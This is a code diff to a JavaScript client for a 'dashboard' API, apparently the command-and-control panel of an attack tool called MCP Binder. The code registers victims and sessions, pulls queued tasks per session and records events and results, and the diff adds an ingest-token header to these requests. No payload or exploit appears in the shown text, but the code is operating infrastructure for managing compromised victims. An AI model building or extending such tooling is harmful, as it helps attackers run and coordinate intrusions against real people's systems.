@@ -17,14 +17,19 @@ export function normalizeDashboardBase(value) {
   return url.toString().replace(/\/+$/, "");
 }
 
-export function dashboardHeaders(token) {
+export function dashboardHeaders(token, options = {}) {
   const headers = {
     "Content-Type": "application/json"
   };
   const value = String(token || "").trim();
+  const ingestToken = String(options.ingestToken || "").trim();
 
   if (value) {
     headers.Authorization = `Bearer ${value}`;
+  }
+
+  if (ingestToken) {
+    headers["X-MCP-Binder-Ingest-Token"] = ingestToken;
   }
 
   return headers;
@@ -73,40 +78,44 @@ export async function queueDashboardTask(baseUrl, token, sessionId, task) {
   });
 }
 
-export async function takeDashboardTasks(baseUrl, sessionId) {
+export async function takeDashboardTasks(baseUrl, sessionId, ingestToken = "") {
   const sid = String(sessionId || "").trim();
 
   if (!sid) {
     throw new Error("Session ID is required.");
   }
 
-  return normalizeTaskResponse(await dashboardRequest(baseUrl, `/api/tasks/${encodeURIComponent(sid)}`));
+  return normalizeTaskResponse(await dashboardRequest(baseUrl, `/api/tasks/${encodeURIComponent(sid)}`, { ingestToken }));
 }
 
-export async function registerDashboardVictim(baseUrl, victim) {
+export async function registerDashboardVictim(baseUrl, victim, ingestToken = "") {
   return dashboardRequest(baseUrl, "/api/victims", {
     method: "POST",
+    ingestToken,
     body: victim
   });
 }
 
-export async function registerDashboardSession(baseUrl, session) {
+export async function registerDashboardSession(baseUrl, session, ingestToken = "") {
   return dashboardRequest(baseUrl, "/api/sessions", {
     method: "POST",
+    ingestToken,
     body: session
   });
 }
 
-export async function recordDashboardEvent(baseUrl, event) {
+export async function recordDashboardEvent(baseUrl, event, ingestToken = "") {
   return dashboardRequest(baseUrl, "/api/events", {
     method: "POST",
+    ingestToken,
     body: event
   });
 }
 
-export async function recordDashboardResult(baseUrl, result) {
+export async function recordDashboardResult(baseUrl, result, ingestToken = "") {
   return dashboardRequest(baseUrl, "/api/results", {
     method: "POST",
+    ingestToken,
     body: result
   });
 }
@@ -183,7 +192,7 @@ async function dashboardRequest(baseUrl, path, options = {}) {
   try {
     response = await fetch(`${base}${path}`, {
       method: options.method || "GET",
-      headers: dashboardHeaders(options.token),
+      headers: dashboardHeaders(options.token, { ingestToken: options.ingestToken }),
       body: options.body ? JSON.stringify(options.body) : undefined,
       cache: "no-store"
     });
